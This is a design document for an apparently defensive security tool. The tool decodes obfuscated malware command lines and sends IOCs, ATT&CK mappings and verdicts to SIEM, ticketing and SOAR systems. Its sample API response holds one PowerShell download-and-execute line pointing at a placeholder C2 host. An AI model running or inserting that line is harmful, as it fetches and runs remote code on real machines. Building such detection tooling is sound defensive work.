# NivXRay · Capabilities & Design Document (HLD + LLD)

**Version:** 1.0 · Feb 2026
**Type:** Technical design document — HLD (architecture) + LLD (component detail)
**Audience:** Solution architects, integration engineers, SOC engineering leads

---

## 0. Product Name — Options for Rebrand

The current codename **NivXRay** is strong for a technical decoder, but for enterprise sales you may want a name that signals **triage**, **intelligence**, or **decoder** more explicitly. Recommendations:

| Option | Positioning | Tagline |
|--------|-------------|---------|
| **NivXRay** *(current)* | Cyber-forensics tool feel · X-ray metaphor | "See through the obfuscation." |
| **Cognis** ⭐ | Latin *cognoscere* (to know) · already used as your Persona name | "Analyst-ready intelligence, without the guesswork." |
| **Deobfuscate** / **DeobIQ** | Direct, functional | "The command-line decoder for the modern SOC." |
| **PayloadLens** ⭐ | Visual metaphor · analyst-friendly | "Focus on what the attacker actually ran." |
| **CommandLens** | Analyst mental model match | "Every commandline, decoded and understood." |
| **StackPeel** | Layer-by-layer decode metaphor | "Peel every obfuscation layer, deterministically." |
| **Threat X-Ray** | Extends NivXRay branding | "The X-Ray of the malware kill chain." |
| **DecoderOne** | Enterprise SaaS naming pattern | "One paste. Full triage." |
| **AtomicDecode** | Nods to Atomic Red Team culture | "Deterministic decode for adversary emulation." |
| **DFIR Prism** | Angle on breaking obfuscation into spectrum | "Refract every payload into its true form." |

**Top 2 recommendations:**
1. **PayloadLens** — analyst-friendly, immediately understandable, enterprise-sellable, trademark-clean-looking
2. **Cognis** — leverages your existing Persona brand, Latin roots convey trust/intelligence, works as a company + product name

---

## 1. Product Positioning (One-Liner)

> **PayloadLens is a deterministic malware commandline decoder & threat-intelligence platform that plugs into EDR alerts and pushes decoded IOCs, MITRE ATT&CK mappings, and SOC verdicts into the SIEM/ITSM/SOAR stack — reducing analyst decode time from 30 minutes to <30 seconds.**

---

## 2. Core Capabilities

### 2.1 Deterministic Decoding
- **34+ decoder plugins** covering Base64/Base32/Base58/Base91/Ascii85, gzip/zlib/brotli/lzma/zstd/snappy/bzip2/LZ4, UTF-16LE/UTF-16BE, URL encoding, hex, ROT13/ROT47/Caesar, XOR (1-8 byte keys, brute-force + LOLBAS-guided), and reconstruction (PowerShell, CMD, JS, VBS).
- **Recursive orchestrator** that auto-detects encoding stack and peels layer by layer with runtime budget enforcement.
- **Zero LLM dependency** — every decode is reproducible, audit-safe, and works offline.

### 2.2 Command-Line Reconstruction
- **PowerShell:** `-EncodedCommand`, `[char]`, `[ScriptBlock]::Create`, `-join`, `-f` format op, `.Replace()`, `$var` expansion, `IEX $var` / `& $var` invocation reveal, backtick escape stripping.
- **CMD:** `%VAR%` expansion, `!DELAYED!` (V:ON), caret escape (`c^m^d`), `SET`/`CALL` reveal.
- **JavaScript:** `String.fromCharCode`, `atob(base64)`, `unescape(%hex)`, `eval()` unwrap.
- **VBScript:** `Chr()`/`ChrW()` chain, `CreateObject("ProgID")` reveal.

### 2.3 Analyst-Ready Intelligence Extraction
- **IOCs:** URLs (defanged + normal), IPs (IPv4/IPv6), domains, email, file hashes (MD5/SHA1/SHA256), User-Agents, mutex names.
- **LOLBAS/LOLBIN detection:** 200+ known Living-off-the-Land binaries with context (certutil, bitsadmin, mshta, rundll32, regsvr32, msiexec, wmic, powershell, cmd, cscript, wscript, etc.).
- **MITRE ATT&CK mapping:** Automatic technique + sub-technique tagging with evidence (T1027, T1059.001, T1105, T1197, T1140, T1055, T1071.001…).
- **Malware family attribution:** Cobalt Strike, Meterpreter, Emotet, RedLine, XWorm, NjRAT, FormBook (Phase D in-progress).
- **SOC verdict card:** Confidence-scored final verdict (MALICIOUS / SUSPICIOUS / BENIGN / SHELLCODE-DETECTED) with copy-ready summary.

### 2.4 OSINT Enrichment (Optional, Toggle-able)
- VirusTotal · AbuseIPDB · URLScan · Shodan · AlienVault OTX · Hybrid Analysis · abuse.ch · IP-API geolocation · DNS reverse lookup.

### 2.5 Analyst UX
- **Auto-Investigate:** one-click full recursive decode + enrichment + verdict.
- **Chain Mode:** manual recipe builder for deep-dive analysts.
- **Decoding Trace panel:** layer-by-layer view with confidence, previews, engine attribution.
- **Investigation Graph:** visual kill-chain (raw payload → decode ops → IOCs → MITRE → LOLBIN → family).
- **Batch Analyst:** paste 1-500 payloads or drop a `.docx/.pdf/.eml/.csv` — every candidate runs through the pipeline.
- **Training Notes:** admin-configurable directives to bias decoder behavior for specific campaigns.

### 2.6 Reporting & Export
- SOC-ready plain-text investigation summary (copy-paste to tickets)
- STIX 2.1 bundle export for TIP integration (MISP / OpenCTI / ThreatConnect)
- CSV export of IOCs
- JSON payload for API consumers
- Screenshot / PNG / SVG of investigation graph

---

## 3. High-Level Design (HLD)

### 3.1 Architecture Diagram

```
                    ┌──────────────────────────────────────────────┐
                    │                 PRESENTATION                  │
                    │  ┌────────────────────────────────────────┐  │
                    │  │  React SPA · Workspace · Batch · Admin │  │
                    │  └────────────────────────────────────────┘  │
                    └──────────────────┬───────────────────────────┘
                                       │  HTTPS · REST · SSE
                    ┌──────────────────▼───────────────────────────┐
                    │                 API GATEWAY                   │
                    │           FastAPI · JWT · CORS · Ingress      │
                    └──────────────────┬───────────────────────────┘
              ┌───────────────────────┼─────────────────────────┐
              │                       │                          │
       ┌──────▼──────┐        ┌───────▼──────┐          ┌────────▼────────┐
       │  DECODE     │        │  ENRICHMENT   │          │  INTEGRATION     │
       │  ENGINE     │        │  SERVICES     │          │  ADAPTERS        │
       │             │        │               │          │                  │
       │ Orchestrator│        │ OSINT clients │          │ EDR ingest       │
       │ 34 plugins  │        │ VT · Shodan   │          │ SIEM emit        │
       │ Fingerprint │        │ AbuseIPDB     │          │ ITSM emit        │
       │ Budget      │        │ URLScan · OTX │          │ SOAR bridge      │
       │ Trace       │        │ TI cache      │          │ STIX export      │
       └──────┬──────┘        └───────┬──────┘          └────────┬────────┘
              │                       │                          │
              └───────────┬───────────┴──────────┬───────────────┘
                          │                      │
                    ┌─────▼──────┐        ┌──────▼─────┐
                    │  MongoDB   │        │   Redis    │
                    │            │        │            │
                    │ Cases      │        │ Job queue  │
                    │ Users      │        │ Rate limit │
                    │ KB         │        │ Cache      │
                    │ AI cache   │        │            │
                    │ Training   │        │            │
                    └────────────┘        └────────────┘
```

### 3.2 Component Responsibilities

| Layer | Component | Responsibility |
|-------|-----------|-----------------|
| **UI** | React SPA | Analyst workspace, batch analyst, admin panel |
| **Gateway** | FastAPI | Auth, rate-limit, CORS, request routing |
| **Engine** | Orchestrator | Fingerprint input, dispatch decoders, budget enforcement, trace building |
| **Engine** | Decoder plugins | Isolated units — detect + decode + emit findings |
| **Engine** | IOC extractor | Regex + heuristic extraction from decoded output |
| **Engine** | MITRE mapper | LOLBAS + IOC → ATT&CK technique mapping |
| **Engine** | Family classifier | Signature-based malware family attribution |
| **Engine** | Verdict engine | Multi-signal risk scoring → SOC verdict card |
| **Enrichment** | OSINT clients | Async fan-out to VT / AbuseIPDB / Shodan / etc. |
| **Integration** | EDR ingester | Webhook receivers per EDR vendor |
| **Integration** | SIEM emitter | Splunk HEC / Sentinel DCR / Chronicle UDM push |
| **Integration** | ITSM emitter | ServiceNow / Jira / PagerDuty ticket create |
| **Integration** | SOAR bridge | Playbook action endpoints |
| **Storage** | MongoDB | Persistent cases, users, KB, cache |
| **Storage** | Redis | Job queue, rate-limit counters, hot cache |

### 3.3 Data Flow (EDR → SOC Ticket · End-to-End)

```
[1] EDR fires alert
       │  (obfuscated commandline in alert payload)
       ▼
[2] EDR webhook → PayloadLens /api/v2/analyze
       │  { input, edr_source, host, user, detection_id }
       ▼
[3] Orchestrator fingerprints input
       │  entropy, printable ratio, wrapper detection
       ▼
[4] Decoder plugins peel layers (recursive)
       │  extract-payload → base64-decode → utf16le → ps-reconstruct → ioc-extract
       ▼
[5] IOC extractor + MITRE mapper + Family classifier
       │  URLs, IPs, domains, LOLBAS, ATT&CK, family
       ▼
[6] OSINT enrichment fan-out (parallel)
       │  VT, AbuseIPDB, URLScan, Shodan
       ▼
[7] Verdict engine composes SOC verdict
       │  score, family, C2, MITRE, User-Agent, arch
       ▼
[8] Response JSON returned to caller
       │
       ├─▶ SIEM emitter → Splunk HEC / Sentinel / QRadar / Chronicle
       ├─▶ ITSM emitter → ServiceNow SIR / Jira SM / PagerDuty
       └─▶ SOAR bridge → XSOAR / Splunk SOAR / Tines playbook
```

---

## 4. Low-Level Design (LLD)

### 4.1 Decode Engine — Plugin Model

Every decoder is a plugin implementing this interface:

```python
class BaseDecoder:
    id: str                                     # e.g. "ps-reconstruct"
    name: str                                   # human name
    category: str                               # "encoding" | "compression" | "reconstruct" | ...
    cost: int                                   # relative CPU cost (1-10)
    tags: tuple[str, ...]
    schema_version: str

    def detect(self, payload, fp, ctx) -> DetectResult:
        """Fast confidence estimation (0.0-1.0). Should be O(len)."""

    def decode(self, payload, args, ctx) -> PluginResult:
        """Actual decode. Returns output + findings + explanations."""
```

**Orchestrator loop:**
```
while not fingerprint.stable() and budget.remaining():
    candidates = [(plugin.detect(payload, fp, ctx), plugin) for plugin in registry]
    winner = argmax(confidence, cost_penalty)
    if winner.confidence < FLOOR: break
    result = winner.decode(payload, args, ctx)
    trace.append(result)
    payload = result.output
    fp = fingerprint(payload)
```

### 4.2 API Endpoints (Public Contract)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/v2/analyze` | POST | Full analyze (Auto-Investigate) |
| `/api/decode/smart` | POST | Fast recursive decode only |
| `/api/decode/chain` | POST | Manual chain recipe execution |
| `/api/v2/analyze/report?fmt=stix` | GET | STIX 2.1 bundle export |
| `/api/v2/analyze/report?fmt=json` | GET | JSON report export |
| `/api/cases` | GET/POST | Case management (save/load) |
| `/api/kb/search` | GET | Knowledge base search |
| `/api/batch/run` | POST | Batch analyst execution |
| `/api/ai/*` | * | Optional AI enrichment (admin-toggle-able) |
| `/api/admin/*` | * | Admin panel APIs |

### 4.3 Request/Response Contract

**Request (`POST /api/v2/analyze`):**
```json
{
  "input": "powershell -e SQBFAFgA...",
  "context": {
    "edr_source": "crowdstrike|sentinelone|defender|carbonblack",
    "host": "WKSTN-042",
    "user": "j.doe",
    "detection_id": "ldt:abc123",
    "severity": "high|medium|low",
    "timestamp": "2026-02-01T14:32:00Z"
  },
  "options": {
    "enable_osint": true,
    "enable_ai": false,
    "max_depth": 10,
    "wall_time_ms": 8000
  }
}
```

**Response (abridged):**
```json
{
  "verdict": {
    "level": "malicious",
    "score": 98,
    "family": "cobalt-strike",
    "confidence": 92,
    "one_liner": "Cobalt Strike stager (x86) — C2 149.28.81.19"
  },
  "recovered_payload": "IEX((New-Object Net.WebClient).DownloadString('http://c2.io/beacon.ps1'))",
  "trace": [
    {"decoder": "extract-payload", "confidence": 0.95, "preview": "...", "duration_ms": 2},
    {"decoder": "base64-decode",   "confidence": 0.99, "preview": "...", "duration_ms": 4},
    {"decoder": "utf16le-decode",  "confidence": 0.98, "preview": "...", "duration_ms": 1},
    {"decoder": "ps-reconstruct",  "confidence": 0.90, "preview": "...", "duration_ms": 3},
    {"decoder": "ioc-extract",     "confidence": 1.00, "preview": "...", "duration_ms": 1}
  ],
  "iocs": {
    "urls": ["http://c2.io/beacon.ps1"],
    "ips": ["149.28.81.19"],
    "domains": ["c2.io"],
    "user_agents": ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"],
    "hashes": []
  },
  "mitre": [
    {"id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "evidence": "IEX invocation"},
    {"id": "T1027",     "name": "Obfuscated Files or Information", "tactic": "Defense Evasion"},
    {"id": "T1105",     "name": "Ingress Tool Transfer", "tactic": "Command and Control"}
  ],
  "lolbas": [
    {"binary": "powershell.exe", "context": "DownloadString"}
  ],
  "osint": {
    "virustotal": {"url_verdict": "malicious", "detections": "10/89"},
    "abuseipdb": {"confidence_of_abuse": 87},
    "shodan": {"ports": [443, 22], "asn": "AS20473 Choopa"}
  },
  "case_id": "nvx-2026-02-01-abc123",
  "processing_ms": 847
}
```

### 4.4 EDR Integration — CrowdStrike Example (LLD)

**Webhook receiver:** `POST /api/edr/crowdstrike/webhook`

**Payload from Falcon Streaming API** (subscription to `DetectionSummaryEvent`):
```json
{
  "metadata": {"eventType": "DetectionSummaryEvent", "customerIDString": "..."},
  "event": {
    "DetectId": "ldt:...",
    "Severity": 90,
    "CommandLine": "powershell.exe -e SQBFAFgA...",
    "ComputerName": "WKSTN-042",
    "UserName": "j.doe",
    "FileName": "powershell.exe",
    "SHA256HashData": "...",
    "Technique": "T1059.001"
  }
}
```

**PayloadLens receiver logic:**
```python
@router.post("/edr/crowdstrike/webhook")
async def cs_webhook(body: CSPayload, sig = Depends(verify_cs_signature)):
    detection = body.event
    cmd = detection.CommandLine
    if not looks_obfuscated(cmd):
        return {"skipped": "no obfuscation detected"}

    result = await orchestrator.run(cmd, context={
        "edr_source": "crowdstrike",
        "host": detection.ComputerName,
        "user": detection.UserName,
        "detection_id": detection.DetectId,
        "severity": detection.Severity
    })

    if result.verdict.level == "malicious":
        await sink_to_sink_of_choice(result, detection)

    return {"case_id": result.case_id, "verdict": result.verdict}
```

### 4.5 SIEM Integration — Splunk HEC Example (LLD)

**Emitter** invoked after successful analyze:
```python
async def emit_to_splunk(result: AnalyzeResult):
    event = {
        "source": "payloadlens",
        "sourcetype": "payloadlens:verdict",
        "event": {
            "case_id": result.case_id,
            "verdict": result.verdict.level,
            "score": result.verdict.score,
            "family": result.verdict.family,
            "recovered_payload": result.recovered_payload,
            "iocs": result.iocs,
            "mitre": [t.id for t in result.mitre],
            "lolbas": [l.binary for l in result.lolbas],
            "host": result.context.host,
            "user": result.context.user
        }
    }
    async with httpx.AsyncClient() as client:
        await client.post(SPLUNK_HEC_URL,
                          headers={"Authorization": f"Splunk {SPLUNK_HEC_TOKEN}"},
                          json=event)
```

**Corresponding Splunk correlation rule:**
```
sourcetype=payloadlens:verdict verdict=malicious
| stats count by iocs.ips
| where count > 3
| alert on "Multiple malicious PayloadLens verdicts against same IP"
```

### 4.6 ITSM Integration — ServiceNow SIR Example (LLD)

**Emitter creates SIR incident:**
```python
async def emit_to_servicenow_sir(result: AnalyzeResult):
    incident = {
        "short_description": f"[PayloadLens] {result.verdict.one_liner}",
        "description": build_soc_ticket_body(result),
        "priority": priority_from_score(result.verdict.score),  # 1-4
        "category": "malware",
        "subcategory": result.verdict.family or "unknown",
        "u_mitre_techniques": ",".join(t.id for t in result.mitre),
        "u_iocs_json": json.dumps(result.iocs),
        "u_payloadlens_case_id": result.case_id,
        "u_payloadlens_url": f"{APP_URL}/workspace/case/{result.case_id}",
        "assignment_group": SN_SOC_GROUP,
        "cmdb_ci": lookup_ci_by_hostname(result.context.host)
    }
    async with httpx.AsyncClient() as client:
        await client.post(
            f"{SN_INSTANCE}/api/now/table/sn_si_incident",
            auth=(SN_USER, SN_PASS),
            json=incident
        )
```

### 4.7 Security Controls

- **AuthN/AuthZ:** JWT with short TTL + refresh; RBAC (admin, analyst, viewer); optional SAML/OIDC SSO for enterprise.
- **Rate limiting:** Redis-backed per-user quotas (default 1000 analyzes/day).
- **Input validation:** payload size cap (1MB default, configurable); content-type checks; regex-based malicious-name allow/deny lists.
- **Audit logging:** every decode + every OSINT lookup + every SIEM/ITSM emit is logged with request_id, user, timestamp.
- **Data-at-rest:** MongoDB encrypted at rest (K8s PVC encryption or MongoDB Enterprise TDE).
- **Data-in-transit:** TLS 1.2+ enforced at ingress + between microservices.
- **Secrets:** all API keys (Splunk HEC token, ServiceNow creds, OSINT keys) in K8s Secrets / HashiCorp Vault — never in code or DB.
- **Airgap mode:** feature flag `NVX_AIRGAP=true` disables all OSINT + AI + webhook outbound calls.

### 4.8 Scalability & Performance

- **Stateless FastAPI workers** — horizontally scalable behind LB.
- **Redis job queue** for async batch analyzes (>1MB or >10s runtime).
- **MongoDB sharding** on `case_id` when case volume exceeds ~10M.
- **Decode budget** enforced per request (wall_time_ms default 8000, hard cap 30000).
- **OSINT clients** with token-bucket rate limiters + local TTL cache (Redis).
- **Target SLA:** p50 <500ms, p95 <2s, p99 <8s for typical EDR commandlines (<10KB).

### 4.9 Deployment Topology (Kubernetes)

```
┌───────────────────────────────────────────────────────────────┐
│                     Kubernetes Cluster                         │
│                                                                 │
│  Ingress (nginx / Traefik / Istio)                             │
│         │                                                       │
│  ┌──────▼──────────────────────────────────────────┐          │
│  │  Frontend Deployment (React, 2+ replicas)        │          │
│  └──────┬──────────────────────────────────────────┘          │
│         │                                                       │
│  ┌──────▼──────────────────────────────────────────┐          │
│  │  API Deployment (FastAPI, 3-10 replicas · HPA)   │          │
│  └──────┬──────────────────────────────────────────┘          │
│         │                                                       │
│  ┌──────▼──────────────┐   ┌──────────────────────┐           │
│  │  Worker Deployment   │   │  OSINT Fetcher       │           │
│  │  (batch jobs, 2+)    │   │  Deployment (2+)     │           │
│  └──────┬──────────────┘   └──────────┬───────────┘           │
│         │                              │                        │
│  ┌──────▼──────┐  ┌──────────┐  ┌─────▼──────┐                 │
│  │  MongoDB    │  │  Redis   │  │  Vault      │                 │
│  │  StatefulSet│  │          │  │  (secrets)  │                 │
│  └────────────┘  └──────────┘  └─────────────┘                 │
└─────────────────────────────────────────────────────────────────┘
```

**Sizing (Enterprise · 100k alerts/day):**
- API pods: 5 replicas · 1 CPU · 2GB RAM each
- Worker pods: 3 replicas · 2 CPU · 4GB RAM each
- MongoDB: 3-node replica set · 4 CPU · 16GB RAM · 500GB SSD each
- Redis: 3-node cluster · 1 CPU · 4GB RAM each
- Total footprint: ~30 vCPU, ~80GB RAM, ~1.5TB storage

### 4.10 Observability

- **Metrics:** Prometheus scrapes `/metrics` on every service; Grafana dashboards for decode volume, verdict distribution, decoder-specific p95, OSINT call rates.
- **Logs:** structured JSON logs → shipped to Splunk / ELK / Loki.
- **Traces:** OpenTelemetry across ingress → API → decoder → OSINT → emit paths.
- **Alerting:** PagerDuty / Opsgenie on decode error rate spike, OSINT quota exhaustion, MongoDB replication lag.

---

## 5. Certification & Compliance Path

| Standard | Applicability | Status |
|----------|----------------|--------|
| **SOC 2 Type II** | SaaS deployment | Roadmap Q3 2026 |
| **ISO 27001** | Enterprise buyers | Roadmap Q4 2026 |
| **FedRAMP Moderate** | US Federal buyers | Airgap variant only · Q2 2027 |
| **CJIS** | Law enforcement | Airgap mode compatible today |
| **HIPAA** | Healthcare SOCs | Airgap mode compatible today |
| **GDPR** | EU buyers | Compliant — no PII processing in core engine |
| **ITAR** | Defense contractors | Self-hosted only |

---

## 6. Integration Effort Matrix (For the Buyer)

| Integration | Complexity | Time-to-Value |
|--------------|-------------|-----------------|
| CrowdStrike webhook → analyze | Low | 1 day |
| Splunk HEC push | Low | 1 day |
| Microsoft Sentinel DCR push | Medium | 2-3 days |
| ServiceNow SIR create | Medium | 2-3 days |
| Jira SM create | Low | 1 day |
| XSOAR playbook action | Medium | 3-5 days |
| STIX/TAXII to MISP/OpenCTI | Low | 1 day (endpoint already exists) |
| Splunk SOAR (Phantom) app | High | 1-2 weeks (custom app dev) |
| ServiceNow certified store app | High | 4-6 weeks (SN app store submission) |

---

## 7. What's Available Today vs. Roadmap

### ✅ Available (RC2.8 shipped)
- Deterministic decoder (34+ plugins)
- 96.8% chain-completeness on benchmark
- IOC/MITRE/LOLBAS extraction
- OSINT enrichment
- Auto-Investigate + Smart Decode + Chain Mode
- Batch Analyst
- STIX 2.1 export
- SOC verdict card with shellcode detection
- Malware family attribution (Cobalt Strike, Meterpreter, generic loader)

### 🚧 In Progress (Q1 2026)
- RC2.9 · Workspace UX polish (dedicated recovered-payload panel)
- Phase D · Malware family detectors (XWorm, RedLine, FormBook, NjRAT, Emotet)
- `ps-hex-escape` decoder (`\xNN\xNN...` PowerShell hex-escape pattern)
- Chain-Recipe op registration for new decoders

### 🔜 Roadmap (Q2-Q3 2026)
- Phase E · Sandbox detonation bridge (Triage / Hybrid Analysis / Cuckoo)
- Phase F · Native EDR connectors (CrowdStrike, SentinelOne, Defender)
- Phase G · Native SIEM/SOAR packs (Splunk app, Sentinel workbook, XSOAR pack)
- Phase H · ServiceNow certified store app

---

*This document is version-controlled. Update sections 2, 4, and 7 after each RC release.*
